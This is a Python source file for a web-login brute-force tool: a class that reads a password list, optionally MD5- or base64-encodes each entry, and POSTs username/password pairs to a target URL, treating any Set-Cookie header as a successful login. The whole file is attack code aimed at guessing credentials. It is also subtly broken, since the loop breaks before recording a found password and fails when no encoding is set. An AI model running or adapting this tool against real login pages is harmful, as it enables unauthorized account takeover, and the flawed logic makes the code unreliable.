import requests
import hashlib
import threading
import time
from encrypt import encode_base64,encrypt_md5
import requests
import sys

class Brute():

    #TODO:Implement option for username lists
    def __init__(self,host,port,url,passwords_file,pass_enc_type,user_name,wrong_pass_response_status_code = '200'):
        self.target = 'http://' + host  + url 
        print(f'Attempting at {self.target}')
        try:
            passwords_file = open(passwords_file,'r')
        except:
            print("passwords file not found")
        try:
            self.passwords_list = passwords_file.readlines()
        except Exception as e:
            print(str(e))
        self.username = user_name
        self.password_encryption_type = pass_enc_type if pass_enc_type else False
        self.wrong_pass_response_status_code = wrong_pass_response_status_code

    def brutalize(self):
        result=[]
        if self.password_encryption_type:
            if self.password_encryption_type == "md5":
                encrypted_passwords = encrypt_md5(self.passwords_list)
            elif self.password_encryption_type == "base64":
                encrypted_passwords = encode_base64(self.passwords_list)
        number = len(encrypted_passwords)
        for password in encrypted_passwords:
            payload = {
                "username":self.username,
                "password":password
            }
            try:
                response = requests.post(self.target, data=payload)
                if self.confirm(response):
                    break
                    print(f'Found it : {password}')
                    result.append(password)
                number -=1
                print(f"Tried{password}, response was {response.status_code}, {number} left", end='\r' )
                
            except Exception as e: 
                return str(e)
            
        return result

    def confirm(self,response):
        if response.headers.get("Set-Cookie"):
            return True
        else:
            return False
        
    


  

